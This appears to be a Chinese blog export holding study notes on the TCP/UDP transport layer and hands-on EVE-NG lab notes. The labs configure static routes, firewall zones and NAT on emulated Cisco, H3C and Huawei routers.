<li>仅在客户进程运行时动态选择</li>
<li>通信结束后端口号可复用</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>③. 套接字</p>
<ul>
<li>网络中通过IP地址标识不同主机</li>
<li>通过端口号标识主机中的不同应用进程</li>
<li>套接字(Socket) &#x3D; IP地址:端口号<ul>
<li>唯一标识网络中的一台主机上的一个应用进程</li>
<li>是一个通信端点</li>
</ul>
</li>
<li>通信过程：<ul>
<li>主机A发给主机B的报文包含目的端口号和源端口号</li>
<li>源端口号是”返回地址”的一部分</li>
<li>B发回A的报文中的目的端口号是A到B报文的源端口号</li>
<li>完整返回地址是A的IP地址和源端口号</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-1-3-无连接服务与面向连接服务"><a href="#5-1-3-无连接服务与面向连接服务" class="headerlink" title="5.1.3   无连接服务与面向连接服务"></a>5.1.3   无连接服务与面向连接服务</h3><ul>
<li>TCP&#x2F;IP传输协议<ul>
<li>面向连接的传输控制协议 (TCP)<ul>
<li>特点<ul>
<li>全双工的可靠逻辑信道</li>
<li>通信前需建立连接</li>
<li>数据传输结束后释放连接</li>
<li>不提供广播&#x2F;多播服务</li>
</ul>
</li>
<li>可靠性措施<ul>
<li>确认机制</li>
<li>流量控制</li>
<li>计时器</li>
<li>连接管理</li>
</ul>
</li>
<li>适用场景<ul>
<li>文件传输协议(FTP)</li>
<li>超文本传输协议(HTTP)</li>
<li>远程登录(TELNET)</li>
</ul>
</li>
</ul>
</li>
<li>无连接的用户数据报协议 (UDP)<ul>
<li>特点<ul>
<li>不可靠的逻辑信道</li>
<li>通信前无需建立连接</li>
<li>无确认机制</li>
</ul>
</li>
<li>附加服务<ul>
<li>多路复用</li>
<li>数据错误检查</li>
</ul>
</li>
<li>优势<ul>
<li>协议简单</li>
<li>执行速度快</li>
<li>实时性好</li>
</ul>
</li>
<li>适用场景<ul>
<li>小文件传送协议(TFTP)</li>
<li>DNS</li>
<li>SNMP</li>
<li>实时传输协议(RTP)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="5-2-UDP-协议"><a href="#5-2-UDP-协议" class="headerlink" title="5.2   UDP 协议"></a>5.2   UDP 协议</h2><h3 id="5-2-1-UDP-数据报"><a href="#5-2-1-UDP-数据报" class="headerlink" title="5.2.1    UDP 数据报"></a>5.2.1    UDP 数据报</h3><ul>
<li>UDP概述<ul>
<li>UDP特点<ul>
<li>仅在IP数据报服务上增加复用、分用和差错检测功能</li>
<li>优点<ul>
<li><ol>
<li>无须建立连接</li>
</ol>
</li>
<li><ol start="2">
<li>无连接状态</li>
</ol>
</li>
<li><ol start="3">
<li>首部开销小(8B)</li>
</ol>
</li>
<li><ol start="4">
<li>没有拥塞控制</li>
</ol>
</li>
<li><ol start="5">
<li>支持多种交互通信方式</li>
</ol>
</li>
</ul>
</li>
<li>应用场景<ul>
<li>DNS、SNMP等一次性传输较少数据的应用</li>
<li>多媒体应用(IP电话、视频会议、流媒体等)</li>
</ul>
</li>
</ul>
</li>
<li>UDP可靠性<ul>
<li>不保证可靠交付</li>
<li>可靠性可由应用层实现</li>
</ul>
</li>
<li>UDP报文处理<ul>
<li>面向报文</li>
<li>保留报文边界</li>
<li>报文不可分割</li>
</ul>
</li>
</ul>
</li>
<li>UDP首部格式<ul>
<li>组成<ul>
<li>源端口(2B)</li>
<li>目的端口(2B)</li>
<li>长度(2B)</li>
<li>检验和(2B)</li>
</ul>
</li>
<li>字段说明<ul>
<li>源端口：源端口号，可选</li>
<li>目的端口：目的端口号，必须</li>
<li>长度：UDP数据报总长度(最小8)</li>
<li>检验和：可选，全0表示不计算</li>
</ul>
</li>
<li>处理流程<ul>
<li>根据目的端口交付应用进程</li>
<li>端口错误处理：丢弃报文并发送ICMP差错报文</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-2-2-UDP-检验"><a href="#5-2-2-UDP-检验" class="headerlink" title="5.2.2   UDP 检验"></a>5.2.2   UDP 检验</h3><ul>
<li>UDP检验和计算<ul>
<li>伪首部<ul>
<li>12字节临时添加</li>
<li>不向下传送也不向上递交</li>
<li>用于计算检验和</li>
</ul>
</li>
<li>计算方法<ul>
<li>发送方<ul>
<li>检验和字段置全0</li>
<li>伪首部+UDP数据报视为16位字串接</li>
<li>数据部分非偶数字节时补全0字节(不发送)</li>
<li>二进制反码计算16位字和</li>
<li>和的二进制反码写入检验和字段</li>
</ul>
</li>
<li>接收方<ul>
<li>接收数据报+伪首部(非偶数字节补全0)</li>
<li>二进制反码求16位字和</li>
<li>无差错时结果为全1</li>
<li>有差错则丢弃数据报</li>
</ul>
</li>
</ul>
</li>
<li>二进制反码求和规则<ul>
<li>运算规则<ul>
<li>低位到高位逐列计算</li>
<li>0+0&#x3D;0</li>
<li>0+1&#x3D;1</li>
<li>1+1&#x3D;0(进位1)</li>
</ul>
</li>
<li>最高位进位处理<ul>
<li>结果最低位加1(回卷)</li>
</ul>
</li>
</ul>
</li>
<li>特点<ul>
<li>校错能力不强</li>
<li>优点：简单、处理速度快</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="5-3-TCP-协议"><a href="#5-3-TCP-协议" class="headerlink" title="5.3   TCP 协议"></a>5.3   TCP 协议</h2><h3 id="5-3-1-TCP-协议的特点"><a href="#5-3-1-TCP-协议的特点" class="headerlink" title="5.3.1    TCP 协议的特点"></a>5.3.1    TCP 协议的特点</h3><ul>
<li>TCP概述<ul>
<li>在不可靠的IP层之上实现的可靠数据传输协议</li>
<li>解决传输的可靠、有序、无丢失和不重复问题</li>
<li>TCP&#x2F;IP体系中非常复杂的协议</li>
</ul>
</li>
<li>主要特点<ul>
<li>①. 面向连接<ul>
<li>传输层协议</li>
<li>TCP连接是逻辑连接</li>
</ul>
</li>
<li>②. 一对一连接<ul>
<li>每一条TCP连接只能有两个端点</li>
<li>只能是一对一的</li>
</ul>
</li>
<li>③. 可靠交付<ul>
<li>保证数据无差错</li>
<li>保证数据不丢失</li>
<li>保证数据不重复</li>
<li>保证数据有序</li>
</ul>
</li>
<li>④. 全双工通信<ul>
<li>通信双方可随时发送数据</li>
<li>设有发送缓存和接收缓存<ul>
<li>发送缓存用途<ul>
<li>① 发送应用程序传送给发送方TCP准备发送的数据</li>
<li>② TCP已发送但尚未收到确认的数据</li>
</ul>
</li>
<li>接收缓存用途<ul>
<li>① 按序到达但尚未被接收应用程序读取的数据</li>
<li>② 不按序到达的数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>⑤. 面向字节流<ul>
<li>应用程序和TCP交互是一次一个数据块</li>
<li>TCP视为一连串无结构的字节流</li>
</ul>
</li>
</ul>
</li>
<li>TCP与UDP发送方式对比<ul>
<li>UDP报文长度<ul>
<li>由发送应用进程决定</li>
</ul>
</li>
<li>TCP报文长度<ul>
<li>根据接收方窗口值决定</li>
<li>根据当前网络拥塞程度决定</li>
<li>处理方式<ul>
<li>数据块太长：划分后传送</li>
<li>数据块太短：积累足够字节后再发送</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-3-2-TCP-报文段"><a href="#5-3-2-TCP-报文段" class="headerlink" title="5.3.2    TCP 报文段"></a>5.3.2    TCP 报文段</h3><ul>
<li>TCP首部<ul>
<li>固定部分(20B)<ul>
<li>源端口(2B)</li>
<li>目的端口(2B)</li>
<li>序号(4B)</li>
<li>确认号(4B)</li>
<li>数据偏移(4位)</li>
<li>保留(6位)</li>
<li>控制位<ul>
<li>紧急位URG</li>
<li>确认位ACK</li>
<li>推送位PSH</li>
<li>复位位RST</li>
<li>同步位SYN</li>
<li>终止位FIN</li>
</ul>
</li>
<li>窗口(2B)</li>
<li>检验和(2B)</li>
<li>紧急指针(2B)</li>
</ul>
</li>
<li>选项部分(4N B)<ul>
<li>最大报文段长度(MSS)</li>
<li>窗口扩大</li>
<li>时间戳</li>
<li>其他选项</li>
</ul>
</li>
<li>填充</li>
</ul>
</li>
<li>TCP数据部分</li>
<li>封装关系<ul>
<li>TCP报文段封装在IP数据报中</li>
</ul>
</li>
</ul>
<h3 id="5-3-3-TCP-连接管理"><a href="#5-3-3-TCP-连接管理" class="headerlink" title="5.3.3   TCP 连接管理"></a>5.3.3   TCP 连接管理</h3><ul>
<li>TCP连接阶段<ul>
<li>连接建立</li>
<li>数据传送</li>
<li>连接释放</li>
</ul>
</li>
<li>连接建立解决的问题<ul>
<li>确知对方存在</li>
<li>协商参数</li>
<li>分配运输实体资源</li>
</ul>
</li>
<li>TCP连接端点<ul>
<li>套接字(Socket)</li>
<li>唯一由两个套接字确定</li>
<li>同一IP地址可有多个TCP连接</li>
<li>同一端口号可出现在多个TCP连接</li>
</ul>
</li>
<li>客户&#x2F;服务器模式<ul>
<li>客户(Client):主动发起连接</li>
<li>服务器(Server):被动等待连接</li>
</ul>
</li>
<li>1.TCP连接的建立(三次握手)<ul>
<li>步骤1:客户机发送连接请求<ul>
<li>SYN&#x3D;1,seq&#x3D;x</li>
<li>进入SYN-SENT状态</li>
</ul>
</li>
<li>步骤2:服务器确认<ul>
<li>SYN&#x3D;1,ACK&#x3D;1,seq&#x3D;y,ack&#x3D;x+1</li>
<li>进入SYN-RCVD状态</li>
</ul>
</li>
<li>步骤3:客户机确认<ul>
<li>ACK&#x3D;1,seq&#x3D;x+1,ack&#x3D;y+1</li>
<li>进入ESTABLISHED状态</li>
</ul>
</li>
<li>服务器收到确认后进入ESTABLISHED状态</li>
</ul>
</li>
<li>2.TCP连接的释放(四次挥手)<ul>
<li>步骤1:客户机发送释放请求<ul>
<li>FIN&#x3D;1,seq&#x3D;u</li>
<li>进入FIN-WAIT-1状态</li>
</ul>
</li>
<li>步骤2:服务器确认<ul>
<li>ACK&#x3D;1,seq&#x3D;v,ack&#x3D;u+1</li>
<li>进入CLOSE-WAIT状态</li>
<li>客户机进入FIN-WAIT-2状态</li>
</ul>
</li>
<li>步骤3:服务器发送释放请求<ul>
<li>FIN&#x3D;1,ACK&#x3D;1,seq&#x3D;w,ack&#x3D;u+1</li>
<li>进入LAST-ACK状态</li>
</ul>
</li>
<li>步骤4:客户机确认<ul>
<li>ACK&#x3D;1,seq&#x3D;u+1,ack&#x3D;w+1</li>
<li>进入TIME-WAIT状态</li>
<li>服务器进入CLOSED状态</li>
<li>客户机等待2MSL后进入CLOSED状态</li>
</ul>
</li>
</ul>
</li>
<li>计时器<ul>
<li>时间等待计时器(2MSL)</li>
<li>保活计时器<ul>
<li>服务器每收到数据重置</li>
<li>超时后发送探测报文段</li>
<li>连续10次无响应则关闭连接</li>
</ul>
</li>
</ul>
</li>
<li>总结<ul>
<li>建立连接三步<ul>
<li>①SYN&#x3D;1,seq&#x3D;x</li>
<li>②SYN&#x3D;1,ACK&#x3D;1,seq&#x3D;y,ack&#x3D;x+1</li>
<li>③ACK&#x3D;1,seq&#x3D;x+1,ack&#x3D;y+1</li>
</ul>
</li>
<li>释放连接四步<ul>
<li>①FIN&#x3D;1,seq&#x3D;u</li>
<li>②ACK&#x3D;1,seq&#x3D;v,ack&#x3D;u+1</li>
<li>③FIN&#x3D;1,ACK&#x3D;1,seq&#x3D;w,ack&#x3D;u+1</li>
<li>④ACK&#x3D;1,seq&#x3D;u+1,ack&#x3D;w+1</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-3-4-TCP-可靠传输"><a href="#5-3-4-TCP-可靠传输" class="headerlink" title="5.3.4    TCP 可靠传输"></a>5.3.4    TCP 可靠传输</h3><ul>
<li>可靠传输机制<ul>
<li>检验</li>
<li>序号</li>
<li>确认</li>
<li>重传</li>
</ul>
</li>
<li>序号<ul>
<li>定义<ul>
<li>保证数据有序提交给应用层</li>
<li>基于字节流而非报文段</li>
</ul>
</li>
</ul>
</li>
<li>确认<ul>
<li>定义<ul>
<li>确认号&#x3D;期望收到的下一个字节序号</li>
</ul>
</li>
<li>特点<ul>
<li>累积确认</li>
<li>捎带确认</li>
</ul>
</li>
</ul>
</li>
<li>重传<ul>
<li>触发条件<ul>
<li>超时<ul>
<li>自适应算法计算RTO</li>
<li>维护加权平均RTTs</li>
</ul>
</li>
<li>冗余ACK<ul>
<li>定义：重复确认同一报文段</li>
<li>快速重传机制<ul>
<li>收到3个冗余ACK立即重传</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-3-5-TCP-流量控制"><a href="#5-3-5-TCP-流量控制" class="headerlink" title="5.3.5   TCP 流量控制"></a>5.3.5   TCP 流量控制</h3><ul>
<li>功能<ul>
<li>速度匹配服务</li>
<li>匹配发送速率与接收速率</li>
</ul>
</li>
<li>实现机制<ul>
<li>滑动窗口<ul>
<li>接收窗口(rwnd)<ul>
<li>动态调整</li>
<li>反映接收方容量</li>
</ul>
</li>
<li>发送窗口限制<ul>
<li>不超过接收窗口值</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>持续计时器<ul>
<li>零窗口处理<ul>
<li>发送探测报文</li>
<li>重新设置计时器</li>
</ul>
</li>
</ul>
</li>
<li>与数据链路层区别<ul>
<li>范围<ul>
<li>端到端 vs 相邻节点</li>
</ul>
</li>
<li>窗口大小<ul>
<li>动态变化 vs 固定</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="5-3-6-TCP-拥塞控制"><a href="#5-3-6-TCP-拥塞控制" class="headerlink" title="5.3.6   TCP 拥塞控制"></a>5.3.6   TCP 拥塞控制</h3><ul>
<li>拥塞控制概述<ul>
<li>定义<ul>
<li>防止过多数据注入网络</li>
<li>避免路由器或链路过载</li>
</ul>
</li>
<li>表现<ul>
<li>通信时延增加</li>
</ul>
</li>
</ul>
</li>
<li>拥塞控制 vs 流量控制<ul>
<li>拥塞控制<ul>
<li>全局性过程</li>
<li>涉及所有主机和路由器</li>
<li>目标<ul>
<li>让网络承受现有负荷</li>
</ul>
</li>
</ul>
</li>
<li>流量控制<ul>
<li>点对点通信控制</li>
<li>接收端控制发送端</li>
<li>目标<ul>
<li>使接收端来得及接收</li>
</ul>
</li>
</ul>
</li>
<li>相似点<ul>
<li>都通过控制发送速率实现</li>
</ul>
</li>
</ul>
</li>
<li>TCP拥塞控制算法<ul>
<li>慢开始<ul>
<li>原理<ul>
<li>初始cwnd&#x3D;1</li>
<li>指数增长</li>
</ul>
</li>
<li>传输轮次(RTT)后<ul>
<li>cwnd加倍</li>
</ul>
</li>
<li>设置<ul>
<li>慢开始门限ssthresh</li>
</ul>
</li>
</ul>
</li>
<li>拥塞避免<ul>
<li>原理<ul>
<li>cwnd线性增长</li>
</ul>
</li>
<li>每RTT<ul>
<li>cwnd加1</li>
</ul>
</li>
<li>算法切换条件<ul>
<li>cwnd&lt;ssthresh<ul>
<li>慢开始</li>
</ul>
</li>
<li>cwnd&gt;ssthresh<ul>
<li>拥塞避免</li>
</ul>
</li>
<li>cwnd&#x3D;ssthresh<ul>
<li>两者皆可</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>网络拥塞处理<ul>
<li>设置<ul>
<li>ssthresh&#x3D;cwnd&#x2F;2</li>
</ul>
</li>
<li>重置<ul>
<li>cwnd&#x3D;1</li>
</ul>
</li>
<li>执行<ul>
<li>慢开始</li>
</ul>
</li>
</ul>
</li>
<li>快重传<ul>
<li>原理<ul>
<li>收到3个冗余ACK立即重传</li>
</ul>
</li>
<li>优点<ul>
<li>避免等待超时</li>
</ul>
</li>
</ul>
</li>
<li>快恢复<ul>
<li>原理<ul>
<li>收到3个冗余ACK时<ul>
<li>ssthresh&#x3D;cwnd&#x2F;2</li>
<li>cwnd&#x3D;ssthresh</li>
<li>执行拥塞避免</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>窗口管理<ul>
<li>发送窗口上限<ul>
<li>min[rwnd,cwnd]</li>
</ul>
</li>
<li>拥塞窗口(cwnd)动态调整原则<ul>
<li>网络未拥塞<ul>
<li>增大cwnd</li>
</ul>
</li>
<li>网络拥塞<ul>
<li>减小cwnd</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>算法应用场景<ul>
<li>TCP连接建立&#x2F;网络超时<ul>
<li>慢开始+拥塞避免</li>
</ul>
</li>
<li>收到3个冗余ACK<ul>
<li>快重传+快恢复</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>408</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>传输层</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>任务导向计网学习</title>
    <url>/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><ol>
<li><p>资源下载</p>
<blockquote>
<p>eve-ng 懒人版镜像文件在eve-ng懒人社区下载，记住要下载其客户端窗口<br>vm或其他虚拟机软件部署</p>
</blockquote>
</li>
<li><p>网络配置</p>
</li>
</ol>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_1.png" class="" title="在这里插入图片描述">


<hr>
<h2 id="二、网络设备以及配置知识"><a href="#二、网络设备以及配置知识" class="headerlink" title="二、网络设备以及配置知识"></a>二、网络设备以及配置知识</h2><h3 id="网络设备知识"><a href="#网络设备知识" class="headerlink" title="网络设备知识"></a>网络设备知识</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">华为：</span><br><span class="line">	1.路由器：AR系列（save）</span><br><span class="line">	2.交换机：CE系列（commit）</span><br><span class="line">	3.防火墙： </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="基础实验一"><a href="#基础实验一" class="headerlink" title="基础实验一"></a>基础实验一</h3><h4 id="0-任务导向"><a href="#0-任务导向" class="headerlink" title="0. 任务导向"></a>0. 任务导向</h4><img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_2.png" class="" title="在这里插入图片描述">



<p>知识要点：</p>
<ol>
<li>路由器的ip配置</li>
<li>路由配置</li>
</ol>
<hr>
<h4 id="1-设备静态ip配置"><a href="#1-设备静态ip配置" class="headerlink" title="1.设备静态ip配置"></a>1.设备静态ip配置</h4><p>思科设备：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_3.png" class="" title="在这里插入图片描述">

<p>补充ip接口查看：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_4.png" class="" title="在这里插入图片描述">
<p>注意：</p>
<ol>
<li>255.255.255.0 可以使用 24 代替</li>
<li>show ip interface GigabitEthernet0&#x2F;0 查看结果包括子网掩码</li>
</ol>
<hr>
<p>华山设备：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_5.png" class="" title="在这里插入图片描述">

<hr>
<p>华为设备：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_6.png" class="" title="在这里插入图片描述">



<p>删除ip接口信息：</p>
<ol>
<li>进入要删除的ip接口-&gt; undo ip address -&gt; 这个接口的所有ip信息被删除</li>
<li>进入要删除的ip接口-&gt; undo ip address [ip] [mask] -&gt; 接口的指定ip信息被删除</li>
</ol>
<hr>
<h4 id="2-静态路由配置"><a href="#2-静态路由配置" class="headerlink" title="2.静态路由配置"></a>2.静态路由配置</h4><p>目的：实现vIOS-&gt;HUSG600V</p>
<p><strong>正向路由：</strong></p>
<p>对vIOS</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_7.png" class="" title="在这里插入图片描述">
<p><em>对vIOS2 的静态路由配置一样</em>，只是传递的路由ip不同</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_8.png" class="" title="在这里插入图片描述">

<p><strong>值得注意</strong>的是H3CvSR是不需要配置路由的，因为其与目标设备是直连的。</p>
<p><strong>回程路由：</strong></p>
<p>对H3CvSR:</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_9.png" class="" title="在这里插入图片描述">

<p>对于HUSG600V</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_10.png" class="" title="在这里插入图片描述">

<hr>
<p>理论上此时vIOS 可以 ping HUSG600V ， 都是忽略了防火墙是🈲ping的。</p>
<p>解决：需要配置防火墙的信任域</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 华为防火墙默认策略：</span><br><span class="line">同区域流量默认允许（如 trust → trust）</span><br><span class="line">跨区域流量默认拒绝（如 untrust → trust）</span><br><span class="line">所有流量默认拒绝（除非明确配置策略）</span><br></pre></td></tr></table></figure>
<p>g1&#x2F;0&#x2F;0设置在信任任区：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_11.png" class="" title="在这里插入图片描述">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HUSG600V指令：</span><br><span class="line">进入防火墙信任域：</span><br><span class="line">	firewall zone trust  # 查看信任域的详细配置（含绑定接口、优先级）</span><br><span class="line">	display zone # 查看所有安全区域的简要信息（对比其他区域）</span><br><span class="line">查看信任域： display zone trust</span><br></pre></td></tr></table></figure>

<p>指令总结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">删除指令 ： undo 原有指令</span><br><span class="line">实用查看指令：display this  </span><br></pre></td></tr></table></figure>
<hr>
<h3 id="基础实验二"><a href="#基础实验二" class="headerlink" title="基础实验二"></a>基础实验二</h3><h4 id="0-任务导向-1"><a href="#0-任务导向-1" class="headerlink" title="0.任务导向"></a>0.任务导向</h4><img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_12.png" class="" title="在这里插入图片描述">
<p><strong>账号：AR1000vN（N：数字）</strong><br><strong>密码 qwer1234KK. 或 qwer1234KK 或 12345678KK</strong><br><strong>华为回退：ctrl+h</strong></p>
<p><strong>知识要点：</strong></p>
<ol>
<li>NAT映射</li>
<li>路由直连</li>
</ol>
<hr>
<p><strong>问题：</strong></p>
<ol>
<li>vpc1怎么将数据包给AR1000v4？</li>
<li>AR1000v4怎么将数据包给vpc2或vpc3？</li>
<li>vpc2或vpc3怎么回复vpc1?</li>
</ol>
<hr>
<h4 id="1-普通路由"><a href="#1-普通路由" class="headerlink" title="1.普通路由"></a>1.普通路由</h4><p><strong>对链路vpc1&lt;—&gt;vpc2：</strong> </p>
<p><strong>（1）正向：</strong></p>
<p><strong>vpc</strong>的静态ip配置格式：<strong>ip &lt;IP地址&gt; &lt;子网掩码&gt; [&lt;默认网关&gt;]</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_13.png" class="" title="在这里插入图片描述">
<p>这里的0.0.0.0并不代表有效的网关，实际效果等同于 “未配置可用网关”。此时 VPC 只能与同一子网内的设备通信（如192.168.1.x网段），无法访问其他子网</p>
<p>设置网关：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_14.png" class="" title="在这里插入图片描述">

<p>vpc1将包发给AR1000v4,需设置ARC1000v4到vpc2,vpc3的<strong>路由</strong><br>静态路由格式：<strong>ip route-static &lt;目的网段&gt; &lt;前缀长度&gt; &lt;下一跳IP地址&gt;</strong></p>
<p>对AR1000v:</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_15.png" class="" title="在这里插入图片描述">

<p>对AR1000v6:</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_16.png" class="" title="在这里插入图片描述">
<p>发现AR1000v6是有192.168.2.2的路由的（因为是直连）</p>
<p><strong>（2）反向：</strong></p>
<p>对AR1000v6:</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_17.png" class="" title="在这里插入图片描述">

<p>同理：AR1000v4不需要配置vpc1的静态路由</p>
<p>vpc1:成功ping通</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_18.png" class="" title="在这里插入图片描述">

<p><strong>抓取vpc1-eth0：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_19.png" class="" title="在这里插入图片描述">

<p><strong>抓取AR1000v4-g0&#x2F;0&#x2F;0：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_20.png" class="" title="在这里插入图片描述">


<p><strong>抓取AR1000v4-g0&#x2F;0&#x2F;1：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_21.png" class="" title="在这里插入图片描述">





<hr>
<h4 id="2-NAT映射"><a href="#2-NAT映射" class="headerlink" title="2.NAT映射"></a>2.NAT映射</h4><p><strong>对链路vpc1&lt;—&gt;vpc2 :</strong></p>
<p><strong>假设：有AR1000v4的权限，没有AR1000v5的权限，即无法配置其静态路由。由直连路由知识可知，AR1000v4与AR1000v5 AR1000V5与vpc2 由静态路由 。<br>所以，只要将vpc1的静态ip映射为AR1000v4与AR1000v5连接的接口的静态ip（10.2.2.1）,就可以实现数据传输</strong></p>
<p>只需操作AR1000v4:</p>
<ol>
<li>什么样的数据包需要做网络地址转换？(192.168.1.1&#x2F;24)</li>
</ol>
<p>配置AR1000v4到vpc2的路由：</p>
<blockquote>
<p>[Huawei]ip route-static 192.168.3.0 24 10.2.2.2</p>
</blockquote>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_22.png" class="" title="在这里插入图片描述">

<p><strong>此时，不需要对AR1000v5配置vpc1的路由，这是最重要的区别</strong></p>
<p>实现NAT映射：</p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_23.png" class="" title="在这里插入图片描述">

<p><strong>抓取vpc1-eth0：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_24.png" class="" title="在这里插入图片描述">

<p><strong>抓取AR1000v4-g0&#x2F;0&#x2F;0：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_25.png" class="" title="在这里插入图片描述">



<p><strong>抓取AR1000v4-g0&#x2F;0&#x2F;1：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_26.png" class="" title="在这里插入图片描述">


<hr>
<h3 id="基础实验三"><a href="#基础实验三" class="headerlink" title="基础实验三"></a>基础实验三</h3><h4 id="0-任务导向-2"><a href="#0-任务导向-2" class="headerlink" title="0.任务导向"></a>0.任务导向</h4><img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_27.png" class="" title="在这里插入图片描述">


<p>知识要点：</p>
<ol>
<li>交换机配置（多vlan局域网配置，安全策略，跨网段路由配置）</li>
<li>vlan间的可控互通（vlanif:vlan网关）</li>
<li>acl：访问控制限制</li>
<li>NAT的映射形式与端口映射</li>
</ol>
<p><strong>账号：AR1000vN（N：数字）</strong><br><strong>密码：qwer1234KK. 或 qwer1234KK 或 12345678KK</strong><br><strong>华为回退：ctrl+h</strong></p>
<hr>
